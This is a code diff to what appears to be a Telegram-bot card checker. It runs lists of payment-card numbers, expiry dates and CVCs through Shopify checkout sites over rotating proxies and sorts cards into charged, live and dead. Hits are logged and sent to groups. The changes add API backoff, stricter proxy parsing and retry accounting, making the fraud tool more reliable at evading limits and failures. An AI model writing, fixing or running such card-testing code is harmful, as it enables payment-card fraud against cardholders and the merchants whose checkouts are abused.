@@ -94,10 +94,18 @@ SITE_CONCURRENCY_LIMIT = int(os.environ.get("SITE_CONCURRENCY_LIMIT", 5))
 API_ATTEMPTS = 1
 API_TIMEOUT = 14.0
 
-# FIX #2: separate cap for our-own-limiter saturation (does NOT burn site retries)
+# Saturation: our own limiter, NOT a site failure — separate cap, no retry charge.
 MAX_SATURATION_WAITS = int(os.environ.get("MAX_SATURATION_WAITS", 50))
 
-# FIX #3: sentinel returned when every proxy is cooling down
+# API overload: transient, NOT a proxy failure — exponential backoff on same proxy.
+MAX_API_BACKOFF_WAITS = int(os.environ.get("MAX_API_BACKOFF_WAITS", 4))
+API_BACKOFF_BASE = float(os.environ.get("API_BACKOFF_BASE", 2.0))
+
+# FIX: API_REPLICAS_UNREACHABLE is now handled by the backoff branch below,
+# so it is no longer classed as a proxy error.
+PROXY_ERROR_CODES = {"PROXY_ERROR"}
+
+# FIX #2 from previous audit — saturation sentinel for ProxyManager
 _ALL_COOLED_SENTINEL = "__ALL_COOLED__"
 
 SKIP_SITE_CODES = {
@@ -105,8 +113,6 @@ SKIP_SITE_CODES = {
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "THROTTLED",
     "CAPTCHA_REQUIRED",
 }
-
-PROXY_ERROR_CODES = {"PROXY_ERROR", "API_REPLICAS_UNREACHABLE"}
 
 SITE_ERROR_CODES = {
     "CHECKOUT_FAILED", "CART_FAILED", "GRAPHQL_ERROR", "SITE_ERROR",
@@ -135,7 +141,6 @@ DEAD_CODES = {
     "INVALID_PAYMENT_METHOD", "INCORRECT_NUMBER", "INVALID_ACCOUNT",
 }
 
-# FIX #9: substring patterns that mark an unknown response as a real decline
 DECLINE_HINTS = ("DECLINED", "DECLINE", "REJECTED", "NOT_ALLOWED",
                  "UNAVAILABLE", "PAYMENT_METHOD_REJECTED")
 
@@ -179,7 +184,6 @@ def _cleanup_site_cooldowns(session: dict) -> None:
     }
 
 
-# FIX #1: never block the event loop, one timeout for both sync and async
 async def _safe_bin_lookup(cc_num: str) -> dict:
     def _sync():
         try:
@@ -380,27 +384,27 @@ class ProxyManager:
         self.success_counts = {proxy: 0 for proxy in self.all_proxies}
         self.total_uses = 0
         self.cooldown_seconds = 60
-        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}")
+        dropped = len(self.raw_proxies) - len(self.all_proxies)
+        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}" + (f" (dropped {dropped} malformed)" if dropped else ""))
 
     def _normalize_proxy(self, proxy: str) -> Optional[str]:
         if not proxy or not proxy.strip():
             return None
-        proxy = proxy.strip()
-        if proxy.startswith(('http://', 'https://')):
-            return proxy
-        if proxy.startswith('socks5://'):
-            return 'http://' + proxy[9:]
-        if '@' in proxy and ':' in proxy.split('@')[0]:
-            return f'http://{proxy}'
-        parts = proxy.split()
-        if len(parts) == 4:
-            user, pwd, host, port = parts
-            return f'http://{user}:{pwd}@{host}:{port}'
-        if ':' in proxy and '@' not in proxy:
-            parts = proxy.split(':')
-            if len(parts) == 2 and parts[1].isdigit():
-                return f'http://{proxy}'
-        return f'http://{proxy}'
+        p = proxy.strip()
+        if p.startswith(("http://", "https://")) and "@" in p and ":" in p.rsplit("@", 1)[1]:
+            return p
+        if p.startswith("socks5://"):
+            return "http://" + p[9:]
+        parts = p.split()
+        if len(parts) == 4 and parts[3].isdigit():
+            u, pw, h, port = parts
+            return f"http://{u}:{pw}@{h}:{port}"
+        if len(parts) == 2 and parts[1].isdigit():
+            return f"http://{parts[0]}:{parts[1]}"
+        if "@" in p and ":" in p.split("@", 1)[0]:
+            return f"http://{p}"
+        logging.warning(f"[ProxyManager] Dropping unrecognisable proxy: {p[:60]!r}")
+        return None
 
     def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
         if not self.all_proxies:
@@ -424,8 +428,6 @@ class ProxyManager:
             self.proxy_queue.append(proxy)
             self.total_uses += 1
             return proxy, True
-        # FIX #3: all proxies are cooling down — signal the caller to wait
-        # instead of forcing a known-dead proxy and burning the retry budget.
         if self.failed_proxies:
             return _ALL_COOLED_SENTINEL, True
         return None, False
@@ -554,7 +556,6 @@ def log_hit_to_mshh(user_id, username, first_name):
         logging.error(f"Error writing to mshh.txt: {e}")
 
 
-# FIX #4: exhausted-pool errors are final, not retryable
 FINAL_GOOD_RESPONSES = frozenset({
     "CARD_DECLINED", "INSUFFICIENT_FUNDS", "INVALID_CVC",
     "3DS_REQUIRED", "OTP_REQUIRED", "EXPIRED_CARD",
@@ -848,7 +849,7 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
     elif result_type == "dead":
         cards_to_show = [("❌", c.get('card', 'N/A')) for c in dead_list]
         file_prefix   = "DEAD"
-    else:  # "all" → only hits (charged + live)
+    else:
         cards_to_show = (
             [("💎", c.get('card', 'N/A')) for c in charged_list]
             + [("🔥", c.get('card', 'N/A')) for c in live_list]
@@ -892,7 +893,6 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
     return file_buffer, filename, total_count
 
 
-# FIX #11: retry up to 3 times; only set _summary_posted on success
 async def _post_hits_summary(bot: Bot, session_id: str):
     session = MSH_SESSIONS.get(session_id)
     if not session:
@@ -1084,7 +1084,6 @@ def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboa
     approved_count = session.get('approved', 0)
     dead_count = session.get('dead', 0)
     charged_count = session.get('charged', 0)
-    # FIX #5: All button now reflects hits (charged + live), matching the file
     all_count = (
         len(session.get('charged_cards', []))
         + len(session.get('live_cards', []))
@@ -1279,6 +1278,7 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     no_product_hits  = 0
     pool_exhausted_hits = 0
     saturation_waits = 0
+    api_backoff_waits = 0
     proxy_fail_codes: list[str] = []
 
     parts = cc_formatted.split('|')
@@ -1290,7 +1290,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
     _bin_task = asyncio.create_task(_safe_bin_lookup(cc_num[:6]))
 
-    # FIX #10: ensure the bin task is always reaped on exit
     try:
         while True:
             if is_session_stopped(session_id):
@@ -1307,10 +1306,16 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 result_status = "ERROR"
                 response_msg = f"All sites exhausted ({site_fails} site errors)"
                 break
-            # FIX #2: distinct cap for pool-saturation (our limiter, not the site's)
             if saturation_waits >= MAX_SATURATION_WAITS:
                 result_status = "ERROR"
                 response_msg = f"Site pool saturated ({saturation_waits} waits)"
+                break
+            if api_backoff_waits >= MAX_API_BACKOFF_WAITS:
+                result_status = "ERROR"
+                response_msg = (
+                    f"API_REPLICAS_UNREACHABLE — API overloaded, "
+                    f"{api_backoff_waits} backoffs exhausted"
+                )
                 break
             if no_product_hits >= len(sites_list):
                 result_status = "SKIPPED"
@@ -1323,7 +1328,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 response_msg = "No proxies configured"
                 break
             proxy = proxy_result[0]
-            # FIX #3: every proxy is cooling down — wait, do NOT burn retries
             if proxy == _ALL_COOLED_SENTINEL:
                 await asyncio.sleep(5)
                 continue
@@ -1332,7 +1336,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             if is_session_stopped(session_id):
                 return
 
-            # FIX #7: cooldown cleanup by delta, not modulo
             last_cleanup = session.get('_last_cleanup_count', 0)
             if session['checked'] - last_cleanup >= 100:
                 _cleanup_site_cooldowns(session)
@@ -1373,7 +1376,8 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 await asyncio.wait_for(_site_sem.acquire(), timeout=1.5)
                 _entered = True
             except asyncio.TimeoutError:
-                # FIX #2: saturation is OUR limit, not the site's fault
+                # Saturation is OUR limiter, not the site's failure.
+                # Bump only `saturation_waits`, NEVER `site_fails`.
                 saturation_waits += 1
                 session.setdefault('_blacklisted_sites', {})[site] = (
                     time.time() + 15
@@ -1448,6 +1452,22 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                     f"({no_product_hits}/{len(sites_list)})"
                 )
                 await asyncio.sleep(0.05)
+                continue
+
+            # ── NEW: API overload backoff ──
+            # API_REPLICAS_UNREACHABLE = API replicas slow/overloaded, NOT a
+            # proxy problem. Back off on the SAME proxy without charging
+            # proxy_fails or site_fails.
+            if code == "API_REPLICAS_UNREACHABLE":
+                api_backoff_waits += 1
+                backoff = API_BACKOFF_BASE * (2 ** (api_backoff_waits - 1)) \
+                          + random.uniform(0, 1.0)
+                logging.info(
+                    f"[MSH] API slow for {cc_formatted} — backing off "
+                    f"{backoff:.1f}s (waits={api_backoff_waits}/"
+                    f"{MAX_API_BACKOFF_WAITS}): {message[:80]}"
+                )
+                await asyncio.sleep(backoff)
                 continue
 
             if code in PROXY_ERROR_CODES:
@@ -1541,7 +1561,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 response_msg = message
                 break
 
-            # FIX #9: unknown strings that look like real declines → DEAD
             msg_upper = message.upper()
             if any(k in msg_upper for k in DECLINE_HINTS):
                 result_status = "DEAD"
@@ -1559,7 +1578,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             await asyncio.sleep(0.1)
             continue
 
-        # ── Post-loop: collect bin data and record result ──
         session = MSH_SESSIONS.get(session_id)
         if not session:
             return
@@ -1607,8 +1625,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 send_hit_log_to_group(bot, cc_formatted, response_msg, bin_data, user_obj,
                                       plan_name, proxy_status_formatted, api_price, used_site or "", "CHARGED")
             )
-            # FIX #6: charged cards are always recorded as True regardless
-            # of whether the extra-group delivery succeeded — the charge happened.
             if not sent_to_extra:
                 logging.warning(f"[MSH] CHARGED on {used_site} but extra delivery failed (stat still True)")
             await asyncio.gather(
@@ -1646,7 +1662,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             logging.info(f"[MSH] Skipped→counted as error for outer retry: {cc_formatted}")
 
     finally:
-        # FIX #10: reap the bin task if we exited early
         if not _bin_task.done():
             _bin_task.cancel()
 
@@ -2243,8 +2258,6 @@ async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
     except asyncio.CancelledError:
         raise
     finally:
-        # FIX #12: guarantee status leaves CHECKING so the GC can reap the
-        # session and SESSION_LOCKS does not leak if run_mass_checker crashed.
         s = MSH_SESSIONS.get(session_id)
         if s and s.get('status') == "CHECKING":
             s['status'] = "FINISHED"
